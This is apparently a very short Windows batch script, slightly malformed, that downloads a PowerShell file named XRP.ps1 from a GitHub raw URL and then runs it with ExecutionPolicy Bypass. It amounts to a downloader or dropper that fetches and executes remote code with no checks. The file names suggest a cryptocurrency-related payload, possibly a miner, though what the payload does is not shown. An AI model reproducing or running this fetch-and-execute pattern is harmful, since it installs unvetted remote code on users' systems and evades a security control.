@echo off
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1" -OutFile "C:\XRP.ps1"
-ExecutionPolicy Bypass -File "C:\XRP.ps1"
exit
